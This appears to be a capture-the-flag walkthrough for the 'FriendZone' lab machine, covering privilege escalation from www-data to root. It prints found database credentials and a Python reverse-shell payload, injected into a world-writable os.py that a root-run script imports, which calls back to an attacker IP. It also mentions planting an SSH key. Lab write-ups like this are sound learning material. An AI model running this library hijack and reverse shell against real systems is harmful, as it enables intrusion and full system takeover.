# Priv Esc
- Make it an interactive shell
 ### Enumeration
 
 - We are currently www-data
 -  We get database creds 
 ```bash
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
 ```
 - But mysql port isn't listening on the box right now (port 3306).
 -  We can also try login as friend using su friend and using the given password
 -  In the home directory we can read the user flag.
 -  Run `sudo -l` : `Sorry, user friend may not run sudo on FriendZone.`

### Priv Esc to root
 -  Enumerating further in /opt, we can see a reporter.py
 ```bash
friend@FriendZone:~$ cd /opt/server_admin/
friend@FriendZone:/opt/server_admin$ ls
reporter.py
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer

 ```
 - But this file isn't updating or writing anywhere.
 - Runnig linpeas. Interesting result:
 ```bash
 [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                            
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files  
...[snip]...

/usr/lib/python2.7                                                                                                       
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc                    

...[snip]...

 ```
 - This is because the python script is importing os module. Thus we can change os module to get a reverse shell as root.
 ```python
import socket,subprocess,os                                                       
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)                                 
s.connect(("10.10.14.5",9002))                                                     
dup2(s.fileno(),0)                                                                 
dup2(s.fileno(),1)                                                                 
dup2(s.fileno(),2)                                                                 
import pty                                                                         
pty.spawn("/bin/bash")                        
 ```
 - Adding a revshell script to os module and got the rev shell
 ![[Pasted image 20210329183250.png]]
 - For sanity sake, just add your ssh pub key to root if you want to try anything.
 ```bash
ssh -i friendzone root@10.10.10.123
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jan 24 01:12:41 2019
root@FriendZone:~# ls
certs  root.txt
root@FriendZone:~# ls
certs  root.txt
root@FriendZone:~# ^C
root@FriendZone:~# logout
Connection to 10.10.10.123 closed.

 ```